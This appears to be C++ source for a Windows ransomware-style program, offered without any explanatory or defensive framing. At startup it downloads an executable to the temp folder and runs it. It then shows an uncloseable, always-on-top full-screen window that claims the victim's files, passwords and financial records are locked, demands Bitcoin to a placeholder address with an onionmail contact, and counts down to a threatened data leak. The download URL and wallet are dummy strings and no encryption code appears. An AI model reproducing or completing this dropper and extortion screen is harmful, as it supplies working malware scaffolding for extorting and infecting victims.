
#define UNICODE
#define _UNICODE

#include <windows.h>
#include <wingdi.h>  // Explicitly include for GradientFill
#include <urlmon.h>
#include <shellapi.h>
#include <string>
#include <shlobj.h>
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "msimg32.lib")  // Link against msimg32.lib for GradientFill

std::wstring GetTempDirectory() {
    wchar_t tempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);
    return std::wstring(tempPath);
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    static int countdown = 3600; // 1-hour countdown
    switch (msg) {
        case WM_CREATE: {
            SetTimer(hwnd, 1, 1000, NULL); // 1-second timer
            break;
        }
        case WM_TIMER: {
            countdown--;
            if (countdown <= 0) {
                MessageBoxW(NULL, L"Time's up! Data will be leaked.", L"Deadline", MB_ICONERROR);
            }
            InvalidateRect(hwnd, NULL, TRUE);
            break;
        }
        case WM_PAINT: {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hwnd, &ps);

            RECT rect;
            GetClientRect(hwnd, &rect);
            TRIVERTEX vertex[2];
            vertex[0].x = rect.left;
            vertex[0].y = rect.top;
            vertex[0].Red = 0xFF00;
            vertex[0].Green = 0x0000;
            vertex[0].Blue = 0x0000;
            vertex[0].Alpha = 0x0000;
            vertex[1].x = rect.right;
            vertex[1].y = rect.bottom;
            vertex[1].Red = 0x8000;
            vertex[1].Green = 0x0000;
            vertex[1].Blue = 0x0000;
            vertex[1].Alpha = 0x0000;
            GRADIENT_RECT gRect = {0, 1};
            GradientFill(hdc, vertex, 2, &gRect, 1, GRADIENT_FILL_RECT_V);

            HFONT hFont = CreateFontW(50, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
                DEFAULT_CHARSET, OUT_OUTLINE_PRECIS, CLIP_DEFAULT_PRECIS,
                CLEARTYPE_QUALITY, VARIABLE_PITCH, L"Arial");
            HFONT hOldFont = (HFONT)SelectObject(hdc, hFont);
            SetTextColor(hdc, RGB(255, 255, 255));
            SetBkMode(hdc, TRANSPARENT);
            DrawTextW(hdc, L"YOUR FILES ARE LOCKED!", -1, &rect, DT_CENTER | DT_TOP | DT_SINGLELINE);

            SelectObject(hdc, hOldFont);
            DeleteObject(hFont);
            hFont = CreateFontW(20, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                DEFAULT_CHARSET, OUT_OUTLINE_PRECIS, CLIP_DEFAULT_PRECIS,
                CLEARTYPE_QUALITY, VARIABLE_PITCH, L"Verdana");
            SelectObject(hdc, hFont);

            int y = 100;
            TextOutW(hdc, 20, y, L"Critical Alert: Your system has been compromised.", 49); y += 30;
            TextOutW(hdc, 20, y, L"We have taken control of your sensitive data:", 45); y += 30;
            TextOutW(hdc, 20, y, L"- Personal Files  - Financial Records", 38); y += 30;
            TextOutW(hdc, 20, y, L"- Passwords       - Emails", 26); y += 30;
            y += 20;
            TextOutW(hdc, 20, y, L"To recover your data, follow these steps:", 41); y += 30;
            TextOutW(hdc, 20, y, L"1. Install Exodus Bitcoin wallet.", 33); y += 30;
            TextOutW(hdc, 20, y, L"2. Send 1 USD to this address:", 44); y += 30;
            TextOutW(hdc, 20, y, L"slslsls", 7); y += 30;
            TextOutW(hdc, 20, y, L"3. Contact us at: oaosoos@onionmail.com", 41); y += 30;
            y += 20;
            wchar_t timeStr[50];
            swprintf(timeStr, 50, L"Time remaining: %d:%02d", countdown / 60, countdown % 60);
            TextOutW(hdc, 20, y, timeStr, wcslen(timeStr));

            SelectObject(hdc, hOldFont);
            DeleteObject(hFont);
            EndPaint(hwnd, &ps);
            break;
        }
        case WM_CLOSE:
            return 0; // Prevent closing
        case WM_DESTROY:
            KillTimer(hwnd, 1);
            PostQuitMessage(0);
            break;
        default:
            return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    std::wstring tempDir = GetTempDirectory();
    std::wstring filePath = tempDir + L"laslsl.exe";
    const wchar_t* url = L"laslsl";

    if (URLDownloadToFileW(NULL, url, filePath.c_str(), 0, NULL) == S_OK) {
        ShellExecuteW(NULL, L"open", filePath.c_str(), NULL, NULL, SW_SHOWNORMAL);
    }

    const wchar_t CLASS_NAME[] = L"RansomWindowClass";
    WNDCLASSW wc = {};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;
    RegisterClassW(&wc);

    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    int windowWidth = 900;
    int windowHeight = 600;
    HWND hwnd = CreateWindowExW(
        WS_EX_TOPMOST, CLASS_NAME, L"RANSOMWARE ALERT",
        WS_OVERLAPPED | WS_CAPTION & ~WS_SYSMENU,
        (screenWidth - windowWidth) / 2, (screenHeight - windowHeight) / 2,
        windowWidth, windowHeight, NULL, NULL, hInstance, NULL
    );

    if (hwnd == NULL) return 0;

    ShowWindow(hwnd, SW_SHOWMAXIMIZED);
    UpdateWindow(hwnd);

    MSG msg = {};
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;
}
